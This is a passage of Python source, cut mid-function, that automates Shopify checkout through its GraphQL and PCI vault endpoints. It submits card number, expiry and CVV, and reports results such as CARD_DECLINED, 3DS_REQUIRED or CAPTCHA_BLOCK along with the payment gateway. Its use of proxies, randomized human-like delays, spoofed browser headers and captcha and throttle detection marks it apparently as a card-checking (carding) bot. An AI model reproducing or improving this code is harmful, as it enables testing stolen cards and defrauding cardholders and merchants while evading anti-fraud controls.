            # Check for checkpoint/captcha in errors
            for err in p1_parsed['errors']:
                if err.get('code') == 'CHECKPOINT_BLOCKED':
                    return False, "CAPTCHA_BLOCK", gateway, total_price, currency

            # Log negotiation warnings (these are expected)
            if p1_parsed['errors']:
                warn_codes = [e.get('code', '') for e in p1_parsed['errors'][:3]]
                print(f'[PROPOSAL1] negotiate warnings: {warn_codes}', file=sys.stderr)

            print(f'[PROPOSAL1] result_type={p1_parsed["result_type"]} delivery_resolved={p1_parsed["delivery_resolved"]} checkoutTotal={p1_parsed["checkout_total"]}', file=sys.stderr)
            # Debug: print server_delivery_lines to verify they have full data
            if p1_parsed.get('server_delivery_lines'):
                for _sdi, _sdl in enumerate(p1_parsed['server_delivery_lines']):
                    print(f'[PROPOSAL1] server_dl[{_sdi}]: {json.dumps(_sdl, default=str)[:500]}', file=sys.stderr)
            else:
                print(f'[PROPOSAL1] WARNING: no server_delivery_lines from negotiate response!', file=sys.stderr)

            # Update queue_token and session_token from response
            if p1_parsed['queue_token']:
                queue_token = p1_parsed['queue_token']
            if p1_parsed['session_token']:
                x_checkout_one_session_token = p1_parsed['session_token']
                checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'

            await human_delay(step_name="proposal1")

            # ======== STEP 7: DELIVERY RESOLUTION (if PendingTerms) ========
            delivery_resolved = p1_parsed['delivery_resolved']
            shipping_strategies = p1_parsed['shipping_strategies']
            payment_method_identifier = p1_parsed['payment_method_identifier']
            stable_ids = p1_parsed['stable_ids']
            tax_total = p1_parsed['tax_total']
            checkout_total = p1_parsed['checkout_total']
            checkout_total_currency = p1_parsed['checkout_total_currency']
            is_shipping_required = p1_parsed['is_shipping_required']
            # Server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
            server_delivery_lines = p1_parsed.get('server_delivery_lines', [])
            # Gateway detection from negotiate response
            if p1_parsed.get('gateway_name'):
                gateway = p1_parsed['gateway_name']
                print(f'[GATEWAY] Detected from negotiate: {gateway}', file=sys.stderr)

            # ======== USE SERVER-CONFIRMED MERCHANDISE DETAILS ========
            # If the seller proposal confirmed our merchandise, update our local
            # values to match exactly. This is the key fix for MERCHANDISE_SIGNATURE_MISMATCH:
            # the submit step must send merchandise data that exactly matches what the
            # server has on record. Any discrepancy (even in title formatting) causes
            # the signature validation to fail.
            if p1_parsed.get('seller_variant_id'):
                _seller_vid = p1_parsed['seller_variant_id']
                # Extract numeric ID from gid:// format if needed
                if _seller_vid.startswith('gid://shopify/ProductVariant/'):
                    variant_id = _seller_vid.split('/')[-1]
                else:
                    variant_id = _seller_vid
                print(f'[MERCH_FIX] Using seller-confirmed variant_id={variant_id}', file=sys.stderr)
            
            if p1_parsed.get('seller_product_id'):
                _seller_pid = p1_parsed['seller_product_id']
                if _seller_pid.startswith('gid://shopify/Product/'):
                    product_numeric_id = _seller_pid.split('/')[-1]
                else:
                    product_numeric_id = _seller_pid
                print(f'[MERCH_FIX] Using seller-confirmed product_id={product_numeric_id}', file=sys.stderr)
            
            if p1_parsed.get('seller_price'):
                price = float(p1_parsed['seller_price'])
                if p1_parsed.get('seller_currency'):
                    currency = p1_parsed['seller_currency']
                print(f'[MERCH_FIX] Using seller-confirmed price={price} currency={currency}', file=sys.stderr)
            
            if p1_parsed.get('seller_title'):
                product_title = p1_parsed['seller_title']
                print(f'[MERCH_FIX] Using seller-confirmed title={product_title}', file=sys.stderr)
            
            if p1_parsed.get('seller_requires_shipping') is not None:
                requires_shipping = p1_parsed['seller_requires_shipping']
            
            # Capture server-confirmed digest for MERCHANDISE_SIGNATURE_MISMATCH fix
            _seller_digest = p1_parsed.get('seller_digest') or ''
            if _seller_digest:
                print(f'[MERCH_FIX] Using seller-confirmed digest={_seller_digest[:16]}...', file=sys.stderr)
            
            # Rebuild merch_line with server-confirmed values (including digest)
            merch_line = _build_merchandise_line(
                variant_id=variant_id or product_id_for_cart,
                product_id=product_numeric_id,
                price=price,
                currency=currency,
                title=product_title,
                requires_shipping=requires_shipping,
                quantity=1,
                digest=_seller_digest or None,
            )

            # If delivery is not resolved, poll up to 5 times
            max_delivery_polls = 5
            poll_count = 0
            while not delivery_resolved and poll_count < max_delivery_polls:
                poll_count += 1
                poll_delay = p1_parsed.get('delivery_poll_delay', 500) / 1000.0
                print(f'[DELIVERY_POLL] Waiting {poll_delay:.1f}s for delivery resolution (attempt {poll_count}/{max_delivery_polls})', file=sys.stderr)
                await asyncio.sleep(poll_delay)

                # Re-negotiate with same data to check if delivery resolved
                delivery_poll_data = {
                    'query': QUERY_PROPOSAL,
                    'variables': {
                        'input': {
                            'purchaseProposal': {
                                'buyerIdentity': {
                                    'email': email,
                                    'emailChanged': False,
                                    'phoneCountryCode': country_code,
                                    'marketingConsent': [],
                                    'shopPayOptInPhone': {'countryCode': country_code},
                                    'rememberMe': False,
                                },
                                'merchandise': {
                                    'merchandiseLines': ([{**merch_line, 'stableId': sid} for sid in stable_ids] if stable_ids else [merch_line]),
                                },
                                'delivery': delivery_terms,
                            },
                            'queueToken': queue_token or '',
                        },
                    },
                    'operationName': 'Proposal',
                }

                dp_resp, _ = await retry_on_429(
                    lambda: session.post(
                        graphql_url,
                        params={'operationName': 'Proposal'},
                        headers=checkout_web_headers,
                        json=delivery_poll_data,
                        proxy=proxy, timeout=20, allow_redirects=True
                    ),
                    step_name="delivery_poll", max_retries=1, base_delay=3.0, max_delay=8.0
                )

                if dp_resp and dp_resp.status_code == 200:
                    _refresh_session_token(dp_resp)
                    try:
                        dp_json = json.loads(dp_resp.text)
                        dp_parsed = _parse_negotiate_response(dp_json)
                        
                        if dp_parsed['queue_token']:
                            queue_token = dp_parsed['queue_token']
                        if dp_parsed['session_token']:
                            x_checkout_one_session_token = dp_parsed['session_token']
                            checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                            checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
                        
                        # Update data from polled response
                        if dp_parsed['delivery_resolved']:
                            delivery_resolved = True
                            shipping_strategies = dp_parsed['shipping_strategies']
                            if dp_parsed.get('server_delivery_lines'):
                                server_delivery_lines = dp_parsed['server_delivery_lines']
                            print(f'[DELIVERY_POLL] Resolved! strategies={len(shipping_strategies)}', file=sys.stderr)
                        
                        # Always update tax and totals from latest response
                        if dp_parsed['tax_total'] and dp_parsed['tax_total'] != '0':
                            tax_total = dp_parsed['tax_total']
                        if dp_parsed['checkout_total'] and dp_parsed['checkout_total'] != '0':
                            checkout_total = dp_parsed['checkout_total']
                            checkout_total_currency = dp_parsed['checkout_total_currency']
                        if dp_parsed['payment_method_identifier']:
                            payment_method_identifier = dp_parsed['payment_method_identifier']
                        if dp_parsed['stable_ids']:
                            stable_ids = dp_parsed['stable_ids']
                        if not dp_parsed['is_shipping_required']:
                            is_shipping_required = False
                        # Update gateway from delivery poll
                        if dp_parsed.get('gateway_name') and gateway == 'UNKNOWN':
                            gateway = dp_parsed['gateway_name']
                        
                    except (json.JSONDecodeError, KeyError, TypeError, AttributeError):
                        pass

            if not delivery_resolved and requires_shipping:
                print(f'[DELIVERY_POLL] Timeout — delivery still pending after {max_delivery_polls} polls. Continuing with defaults.', file=sys.stderr)

            # ======== STEP 7b: SELECT SHIPPING STRATEGY ========
            selected_handle = 'shipping'
            selected_shipping_amount = '0'

            if not is_shipping_required:
                # Digital product — update delivery terms for no shipping
                if stable_ids:
                    delivery_terms = _build_delivery_terms(
                        delivery_lines=[],
                        no_delivery_required=[{'stableId': sid} for sid in stable_ids],
                    )
                else:
                    delivery_terms = _build_delivery_terms(
                        delivery_lines=[],
                        no_delivery_required=[],
                    )
            elif shipping_strategies:
                # Prefer strategies with a handle
                handle_strategies = [s for s in shipping_strategies if s.get('handle')]
                if handle_strategies:
                    best = handle_strategies[0]
                    selected_handle = best['handle']
                # KEY FIX v3: Use server_delivery_lines directly instead of rebuilding
                # from scratch. The server's FilledDeliveryTerms already has the exact
                # structure and values we need.
                if server_delivery_lines:
                    _sdl_list = []
                    for _sdl in server_delivery_lines:
                        _sdl_copy = dict(_sdl)
                        if True:  # always override destination with user's shipping address
                            _sdl_copy['destination'] = {
                                'streetAddress': {
                                    'firstName': firstName,
                                    'lastName': lastName,
                                    'address1': street,
                                    'address2': '',
                                    'city': city,
                                    'countryCode': country_code,
                                    'zoneCode': state,
                                    'postalCode': s_zip,
                                    'phone': phone,
                                },
                            }
                        _sdl_list.append(_sdl_copy)
                    delivery_terms = _build_delivery_terms(
                        delivery_lines=_sdl_list,
                        no_delivery_required=[],
                    )
                else:
                    # Fallback: rebuild delivery line with the selected handle
                    delivery_line = _build_delivery_line(
                        currency=currency,
                        first_name=firstName,
                        last_name=lastName,
                        street=street,
                        city=city,
                        country_code=country_code,
                        zone_code=state,
                        postal_code=s_zip,
                        phone=phone,
                        shipping_handle=selected_handle,
                        shipping_amount=None,  # Use {any: true} — shipping cost included in checkoutTotal
                    )
                    delivery_terms = _build_delivery_terms(
                        delivery_lines=[delivery_line],
                        no_delivery_required=[],
                    )

            print(f'[SHIPPING] handle={selected_handle} is_shipping_required={is_shipping_required}', file=sys.stderr)

            # ======== STEP 8: RE-NEGOTIATE TO ACCEPT TAXES ========
            # If the seller's response indicates TAX_NEW_TAX_MUST_BE_ACCEPTED,
            # we need to re-negotiate with the seller's proposed tax amounts.
            # This step also updates the checkout_total with the final amount.

            # Check for tax acceptance needed in errors
            tax_acceptance_needed = False
            for err in p1_parsed['errors']:
                if 'TAX' in str(err.get('code', '')).upper():
                    tax_acceptance_needed = True
                    break

            # Also check if checkout_total is available (means seller has calculated everything)
            if checkout_total and checkout_total != '0':
                # Seller has provided a total — we may need to accept taxes
                tax_acceptance_needed = True

            if tax_acceptance_needed and checkout_total and checkout_total != '0':
                # Build tax acceptance negotiate with seller's amounts
                tax_proposal_data = {
                    'query': QUERY_PROPOSAL,
                    'variables': {
                        'input': {
                            'purchaseProposal': {
                                'buyerIdentity': {
                                    'email': email,
                                    'emailChanged': False,
                                    'phoneCountryCode': country_code,
                                    'marketingConsent': [],
                                    'shopPayOptInPhone': {'countryCode': country_code},
                                    'rememberMe': False,
                                },
                                'merchandise': {
                                    'merchandiseLines': ([{**merch_line, 'stableId': sid} for sid in stable_ids] if stable_ids else [merch_line]),
                                },
                                'delivery': delivery_terms,
                                'taxes': {
                                    'proposedAllocations': None,
                                    'proposedTotalAmount': {'any': True},
                                    'proposedTotalIncludedAmount': None,
                                    'proposedMixedStateTotalAmount': None,
                                    'proposedExemptions': [],
                                },
                            },
                            'queueToken': queue_token or '',
                        },
                    },
                    'operationName': 'Proposal',
                }

                tax_resp, _ = await retry_on_429(
                    lambda: session.post(
                        graphql_url,
                        params={'operationName': 'Proposal'},
                        headers=checkout_web_headers,
                        json=tax_proposal_data,
                        proxy=proxy, timeout=20, allow_redirects=True
                    ),
                    step_name="tax_accept", max_retries=2, base_delay=3.0, max_delay=12.0
                )

                if tax_resp and tax_resp.status_code == 200:
                    _refresh_session_token(tax_resp)
                    try:
                        tax_json = json.loads(tax_resp.text)
                        tax_parsed = _parse_negotiate_response(tax_json)

                        if tax_parsed['queue_token']:
                            queue_token = tax_parsed['queue_token']
                        if tax_parsed['session_token']:
                            x_checkout_one_session_token = tax_parsed['session_token']
                            checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                            checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'

                        # Update totals from tax acceptance response
                        if tax_parsed['checkout_total'] and tax_parsed['checkout_total'] != '0':
                            checkout_total = tax_parsed['checkout_total']
                            checkout_total_currency = tax_parsed['checkout_total_currency']
                        if tax_parsed['tax_total'] and tax_parsed['tax_total'] != '0':
                            tax_total = tax_parsed['tax_total']
                        if tax_parsed['payment_method_identifier']:
                            payment_method_identifier = tax_parsed['payment_method_identifier']
                        if tax_parsed['stable_ids']:
                            stable_ids = tax_parsed['stable_ids']
                        # Update server delivery lines from tax acceptance
                        if tax_parsed.get('server_delivery_lines'):
                            server_delivery_lines = tax_parsed['server_delivery_lines']
                        # Update gateway from tax acceptance
                        if tax_parsed.get('gateway_name') and gateway == 'UNKNOWN':
                            gateway = tax_parsed['gateway_name']
                            print(f'[GATEWAY] Updated from tax_accept: {gateway}', file=sys.stderr)

                        print(f'[TAX_ACCEPT] result_type={tax_parsed["result_type"]} checkout_total={checkout_total} tax={tax_total}', file=sys.stderr)

                        # Check for checkpoint
                        for err in tax_parsed['errors']:
                            if err.get('code') == 'CHECKPOINT_BLOCKED':
                                return False, "CAPTCHA_BLOCK", gateway, total_price, currency

                    except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                        print(f'[TAX_ACCEPT] Parse error: {e}', file=sys.stderr)

                await human_delay(step_name="tax_accept")

            # Calculate total price from checkout_total if available
            if checkout_total and checkout_total != '0':
                total_price = checkout_total
                currency = checkout_total_currency
            else:
                # Fallback: estimate from price + tax
                try:
                    _price_float = float(price) if price else 0
                    _tax_float = float(tax_total) if tax_total else 0
                    total_price = f"{_price_float + _tax_float:.2f}"
                except (ValueError, TypeError):
                    total_price = f"{price}" if price else "0.01"

            # Extract checkoutCardsinkCallerIdentificationSignature for PCI vault auth
            _caller_id_sig = (
                extract_between(checkout_text, 'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;', '&quot')
                or extract_between(checkout_text, '"checkoutCardsinkCallerIdentificationSignature":"', '"')
            )
            if _caller_id_sig:
                print(f'[PCI_SIG] Found caller identification signature ({len(_caller_id_sig)} chars)', file=sys.stderr)
            else:
                print('[PCI_SIG] WARNING: Caller identification signature not found', file=sys.stderr)
            
            # ======== STEP 8b: Fetch checkout page HTML for Shopify-Identification-Signature ========
            # The checkoutCardsinkCallerIdentificationSignature is embedded in the checkout page.
            # It's a HS256 JWT signed by Shopify that authenticates the PCI vault request.
            # Without it, the PCI token is "unsigned" and returns REQUIRED_ARTIFACTS_UNAVAILABLE.
            if not _caller_id_sig and checkout_url:
                try:
                    _sig_resp, _ = await retry_on_429(
                        lambda: session.get(
                            checkout_url,
                            headers=checkout_get_headers,
                            params={'auto_redirect': 'false', 'skip_shop_pay': 'true'},
                            proxy=proxy, allow_redirects=True, timeout=20
                        ),
                        step_name="checkout_sig_fetch", max_retries=1, base_delay=2.0, max_delay=8.0
                    )
                    if _sig_resp and _sig_resp.status_code == 200:
                        _sig_html = _sig_resp.text
                        if not checkout_text:
                            checkout_text = _sig_html
                        _caller_id_sig = (
                            extract_between(_sig_html, 'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;', '&quot')
                            or extract_between(_sig_html, '"checkoutCardsinkCallerIdentificationSignature":"', '"')
                        )
                        if _caller_id_sig:
                            print(f'[PCI_SIG] Fetched caller identification signature ({len(_caller_id_sig)} chars)', file=sys.stderr)
                        else:
                            print('[PCI_SIG] WARNING: Signature not found in fetched checkout page', file=sys.stderr)
                except Exception as _sig_err:
                    print(f'[PCI_SIG] Fetch error: {_sig_err}', file=sys.stderr)

            # ======== STEP 9: PCI VAULT — tokenize card ========
            pci_vault_url = 'https://checkout.pci.shopifyinc.com/sessions'

            _raw_cc = cc.replace(' ', '').replace('-', '')
            _card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc

            # Extract domain for payment_session_scope (matches Shopify's getDomainName() which strips www.)
            import urllib.parse as _urlparse, re as _re
            _netloc = _urlparse.urlparse(ourl).netloc or ourl.replace('https://','').replace('http://','').split('/')[0]
            # Shopify's getDomainName strips www. prefix — must match exactly
            _shop_domain = _re.sub(r'^www\.', '', _netloc)

            # Real browser sends card number with spaces (groups of 4) and includes
            # start_month, start_year, issue_number (null/"") and combined name field
            _cc_spaced = ' '.join([_raw_cc[i:i+4] for i in range(0, len(_raw_cc), 4)])
            pci_data = {
                'credit_card': {
                    'number': _cc_spaced,
                    'month': int(mes),
                    'year': int(ano),
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': f'{firstName} {lastName}',
                },
                'payment_session_scope': _shop_domain,
            }

            sessionid = None

            # Use standard requests for PCI vault (tls_requests can cause issues with HTTP/2 framing)
            try:
                import requests as _sync_requests
                # Real browser: card_fields iframe at checkout.pci.shopifyinc.com makes a
                # SAME-ORIGIN POST to /sessions — browser does NOT send Origin for same-origin.
                # Referer = the specific iframe page URL.
                _pci_build = 'https://checkout.pci.shopifyinc.com/build/27bcf73'
                _pci_hdrs = {
                        'accept': 'application/json',
                        'content-type': 'application/json',
                        'referer': f'{_pci_build}/number-ltr.html?identifier=&locationURL=',
                        'user-agent': hints['ua'],
                    }
                if _caller_id_sig:
                    _pci_hdrs['Shopify-Identification-Signature'] = _caller_id_sig
                print(f'[PCI_VAULT] Sending Shopify-Identification-Signature: {bool(_caller_id_sig)}', file=sys.stderr)
                _pci_resp = _sync_requests.post(
                    pci_vault_url,
                    headers=_pci_hdrs,
                    json=pci_data,
                    timeout=15,
                )
                if _pci_resp.status_code == 200 or _pci_resp.status_code == 201:
                    try:
                        _pci_json = _pci_resp.json()
                        sessionid = _pci_json.get('id') or _pci_json.get('session_id')
                    except (json.JSONDecodeError, ValueError):
                        _pci_text = _pci_resp.text
                        _id_match = re.search(r'"id"\s*:\s*"([^"]+)"', _pci_text)
                        if _id_match:
                            sessionid = _id_match.group(1)
                else:
                    print(f'[PCI_VAULT] HTTP {_pci_resp.status_code}: {_pci_resp.text[:200]}', file=sys.stderr)
            except Exception as _pci_err:
                # Fallback: use tls_requests
                try:
                    _pci_hdrs2 = {
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': ourl,
                            'user-agent': hints['ua'],
                        }
                    if _caller_id_sig:
                        _pci_hdrs2['Shopify-Identification-Signature'] = _caller_id_sig
                    _pci_resp2 = await session.post(
                        pci_vault_url,
                        headers=_pci_hdrs2,
                        json=pci_data,
                        proxy=proxy, timeout=15, allow_redirects=True,
                    )
                    if _pci_resp2.status_code in (200, 201):
                        try:
                            _pci_json2 = json.loads(_pci_resp2.text)
                            sessionid = _pci_json2.get('id') or _pci_json2.get('session_id')
                        except (json.JSONDecodeError, ValueError):
                            pass
                except Exception:
                    pass

            if not sessionid:
                return False, "PCI_VAULT_BLOCKED: Could not tokenize card", gateway, total_price, currency

            print(f'[STEP9] pci_sessionid={sessionid[:20]}...', file=sys.stderr)

            await human_delay(step_name="pci_vault")

            # ======== STEP 10: NEGOTIATE WITH PAYMENT ========
            # Now we add the payment to the negotiation. This is a SEPARATE step
            # from the merchandise+delivery negotiation (step 6).
            
            # If paymentMethodIdentifier wasn't found from seller proposal, try extraction from checkout page
            if not payment_method_identifier:
                paymentMethodIdentifier = (
                    extract_between(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
                    or extract_between(checkout_text, '"paymentMethodIdentifier":"', '"')
                    or extract_between(checkout_text, 'paymentMethodIdentifier\\":\\"', '\\"')
                )
            else:
                paymentMethodIdentifier = payment_method_identifier
            
            # Gateway detection from checkout page HTML
            # Look for gateway identifiers in the checkout page script data
            if gateway == 'UNKNOWN':
                _checkout_gw = None
                # Check for shopify_payments in checkout data
                if 'shopify_payments' in checkout_text:
                    _checkout_gw = 'shopify_payments'
                # Check for other gateways in checkout page
                elif '"gateway":"' in checkout_text:
                    _gw_match = re.search(r'"gateway"\s*:\s*"([^"]+)"', checkout_text)
                    if _gw_match:
                        _checkout_gw = _gw_match.group(1)
                elif '"paymentGateway"' in checkout_text:
                    _gw_match2 = re.search(r'"paymentGateway"\s*:\s*"([^"]+)"', checkout_text)
                    if _gw_match2:
                        _checkout_gw = _gw_match2.group(1)
                if _checkout_gw:
                    _detected = _detect_gateway_from_payment(_checkout_gw, '')
                    gateway = _detected or _checkout_gw
                    print(f'[GATEWAY] Detected from checkout page: {gateway}', file=sys.stderr)

            # If stable_ids weren't found from seller proposal, try extraction from checkout page
            if not stable_ids:
                _sid = (
                    extract_between(checkout_text, "stableId&quot;:&quot;", "&quot")
                    or extract_between(checkout_text, '"stableId":"', '"')
                )
                if _sid:
                    stable_ids = [_sid]

            # Ensure we have stable_ids for delivery terms
            if not stable_ids:
                stable_ids = ['1']  # Fallback

            # Update delivery terms with stable_ids for no-shipping case
            if not is_shipping_required and stable_ids:
                delivery_terms = _build_delivery_terms(
                    delivery_lines=[],
                    no_delivery_required=[{'stableId': sid} for sid in stable_ids],
                )

            attempt_token = str(uuid.uuid4())

            # Build the complete payment negotiate input
            # FIX v4: Include stableId alongside full merchandise data.
            # SessionNegotiationInput requires merchandise, quantity, expectedTotalPrice
            # on each line (same as NegotiationInput). Using stableId-only causes
            # INVALID_VARIABLE errors. We include stableId + sourceProvidedMerchandise.
            # MERCHANDISE_SIGNATURE_MISMATCH is a non-blocking warning that we handle.
            if stable_ids:
                payment_merch_lines = []
                for sid in stable_ids:
                    _ml = dict(merch_line)
                    _ml['stableId'] = sid
                    payment_merch_lines.append(_ml)
            else:
                payment_merch_lines = [merch_line]

            # Also rebuild delivery for PROPOSAL2 using server_delivery_lines if available.
            # KEY FIX v3: Previously we rebuilt delivery from scratch using _build_delivery_line()
            # with shipping_amount=None ({any: true}), which caused DELIVERY_DELIVERY_LINE_DETAIL_CHANGED
            # warnings in the negotiate step itself. Now we use the server's confirmed delivery
            # data directly, which eliminates the mismatch.
            payment_delivery_terms = delivery_terms
            if is_shipping_required and stable_ids:
                if server_delivery_lines:
                    # Use server-confirmed delivery lines directly
                    _pay_dl_list = []
                    for _sdl in server_delivery_lines:
                        _pdl = dict(_sdl)
                        # Ensure destination is present
                        if 'destination' not in _pdl or not _pdl.get('destination'):
                            _pdl['destination'] = {
                                'streetAddress': {
                                    'firstName': firstName,
                                    'lastName': lastName,
                                    'address1': street,
                                    'address2': '',
                                    'city': city,
                                    'countryCode': country_code,
                                    'zoneCode': state,
                                    'postalCode': s_zip,
                                    'phone': phone,
                                },
                            }
                        else:
                            _dest = _pdl.get('destination') or {}
                            _sa = _dest.get('streetAddress') or {}
                            if not _sa.get('firstName'): _sa['firstName'] = firstName
                            if not _sa.get('lastName'): _sa['lastName'] = lastName
                            if not _sa.get('address1'): _sa['address1'] = street
                            if not _sa.get('city'): _sa['city'] = city
                            if not _sa.get('countryCode'): _sa['countryCode'] = country_code
                            if not _sa.get('zoneCode'): _sa['zoneCode'] = state
                            if not _sa.get('postalCode'): _sa['postalCode'] = s_zip
                            if not _sa.get('phone'): _sa['phone'] = phone
                            _pdl['destination'] = {'streetAddress': _sa}
                        _pay_dl_list.append(_pdl)
                    payment_delivery_terms = _build_delivery_terms(
                        delivery_lines=_pay_dl_list,
                        no_delivery_required=[],
                    )
                    print(f'[PROPOSAL2_DL] Using server delivery: {len(_pay_dl_list)} lines', file=sys.stderr)
                else:
                    # Fallback: build from scratch
                    _pay_dl = _build_delivery_line(
                        currency=currency,
                        first_name=firstName,
                        last_name=lastName,
                        street=street,
                        city=city,
                        country_code=country_code,
                        zone_code=state,
                        postal_code=s_zip,
                        phone=phone,
                        shipping_handle=selected_handle,
                        shipping_amount=None,
                    )
                    _pay_dl['targetMerchandiseLines'] = {
                        'lines': [{'stableId': sid} for sid in stable_ids]
                    }
                    payment_delivery_terms = _build_delivery_terms(
                        delivery_lines=[_pay_dl],
                        no_delivery_required=[],
                    )

            payment_proposal_input = {
                'purchaseProposal': {
                    'merchandise': {
                        'merchandiseLines': payment_merch_lines,
                    },
                    'delivery': payment_delivery_terms,
                    'payment': {
                        'totalAmount': {'value': {'amount': f'{total_price}', 'currencyCode': currency}},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentMethodIdentifier or 'shopify_payments',
                                    'sessionId': sessionid,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'firstName': firstName,
                                            'lastName': lastName,
                                            'address1': street,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': country_code,
                                            'zoneCode': state,
                                            'postalCode': s_zip,
                                            'phone': phone,
                                        },
                                    },
                                },
                            },
                            'amount': {
                                'value': {
                                    'amount': f'{total_price}',
                                    'currencyCode': currency,
                                },
                            },
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'firstName': firstName,
                                'lastName': lastName,
                                'address1': street,
                                'address2': '',
                                'city': city,
                                'countryCode': country_code,
                                'zoneCode': state,
                                'postalCode': s_zip,
                                'phone': phone,
                            },
                        },
                        'creditCardBin': _card_bin,
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': currency,
                            'countryCode': country_code,
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False,
                    },
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'any': True,
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': [],
                    'memberships': {'memberships': []},
                    'tip': {'tipLines': []},
                },
                'queueToken': queue_token or '',
                'checkpointData': '',
            }

            payment_proposal_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'input': payment_proposal_input,
                },
                'operationName': 'Proposal',
            }

            p2_resp, _ = await retry_on_429(
                lambda: session.post(
                    graphql_url,
                    params={'operationName': 'Proposal'},
                    headers=checkout_web_headers,
                    json=payment_proposal_data,
                    proxy=proxy, timeout=20, allow_redirects=True
                ),
                step_name="proposal2_payment", max_retries=2, base_delay=3.0, max_delay=12.0
            )

            if not p2_resp or p2_resp.status_code != 200:
                _status = p2_resp.status_code if p2_resp else 'N/A'
                return False, f"PROPOSAL_BLOCKED: HTTP {_status}", gateway, total_price, currency

            p2_text = p2_resp.text
            print(f'[PROPOSAL2_FULL] {p2_text[:3000]}', file=__import__("sys").stderr)

            if is_captcha_required(p2_text):
                return False, "CAPTCHA_REQUIRED on proposal 2", gateway, total_price, currency

            _refresh_session_token(p2_resp)

            # Parse Proposal 2 (payment)
            try:
                p2_json = json.loads(p2_text)
                p2_parsed = _parse_negotiate_response(p2_json)
            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as e:
                return False, f"PROPOSAL_JSON_ERROR: {str(e)}", gateway, total_price, currency

            # Update queue_token and session_token
            if p2_parsed['queue_token']:
                queue_token = p2_parsed['queue_token']
            if p2_parsed['session_token']:
                x_checkout_one_session_token = p2_parsed['session_token']
                checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'

            # Check for critical errors in Proposal 2
            for err in p2_parsed['errors']:
                err_code = err.get('code', '')
                if err_code == 'CHECKPOINT_BLOCKED':
                    return False, "CAPTCHA_BLOCK", gateway, total_price, currency

            # Update checkout_total from Proposal 2 seller response (most accurate)
            if p2_parsed['checkout_total'] and p2_parsed['checkout_total'] != '0':
                total_price = p2_parsed['checkout_total']
                currency = p2_parsed['checkout_total_currency']
            if p2_parsed['tax_total'] and p2_parsed['tax_total'] != '0':
                tax_total = p2_parsed['tax_total']
            # Update gateway from Proposal 2 (payment negotiate — most accurate gateway source)
            if p2_parsed.get('gateway_name') and gateway == 'UNKNOWN':
                gateway = p2_parsed['gateway_name']
                print(f'[GATEWAY] Updated from proposal2: {gateway}', file=sys.stderr)
            # Update server delivery lines from Proposal 2
            if p2_parsed.get('server_delivery_lines'):
                server_delivery_lines = p2_parsed['server_delivery_lines']

            # Update pp['payment'] with server-confirmed paymentMethodIdentifier from PROPOSAL2
            if p2_parsed.get('payment_method_identifier'):
                payment_method_identifier = p2_parsed['payment_method_identifier']
                paymentMethodIdentifier = payment_method_identifier
                _pp_inner = payment_proposal_input.get('purchaseProposal', payment_proposal_input)
                if _pp_inner.get('payment') and _pp_inner['payment'].get('paymentLines'):
                    for _pline in _pp_inner['payment']['paymentLines']:
                        _pdm = (_pline.get('paymentMethod') or {}).get('directPaymentMethod')
                        if _pdm:
                            _pdm['paymentMethodIdentifier'] = payment_method_identifier
                            print(f'[PROPOSAL2] Updated paymentMethodIdentifier → {payment_method_identifier}', file=__import__("sys").stderr)

            # If Proposal 2 already returned SubmittedForCompletion, go to poll
            receipt_id = None
            if p2_parsed['result_type'] == 'SubmittedForCompletion':
                receipt_obj = _dget(p2_json, 'data', 'session', 'negotiate', 'result', 'receipt')
                if receipt_obj:
                    receipt_id = receipt_obj.get('id')
                    if receipt_obj.get('__typename') == 'FailedReceipt':
                        pe = receipt_obj.get('processingError') or {}
                        _pe_type = pe.get('__typename', '') if pe else ''
                        if _pe_type == 'InventoryClaimFailure':
                            return False, "INVENTORY_CLAIM_FAILURE: Item out of stock during payment", gateway, total_price, currency
                        if pe.get('hasOffsitePaymentMethod'):
                            return True, "3DS_REQUIRED", gateway, total_price, currency
                        _ext = _extract_payment_error_response(pe)
                        return False, _ext or "CARD_DECLINED", gateway, total_price, currency
                print(f'[PROPOSAL2] Already SubmittedForCompletion: receipt_id={receipt_id}', file=sys.stderr)
            elif p2_parsed['result_type'] == 'CheckpointDenied':
                return False, "CAPTCHA_BLOCK: CheckpointDenied", gateway, total_price, currency
            elif p2_parsed['result_type'] == 'Throttled':
                return False, "PROPOSAL_BLOCKED: Throttled", gateway, total_price, currency
            elif p2_parsed['result_type'] == 'NegotiationResultFailed':
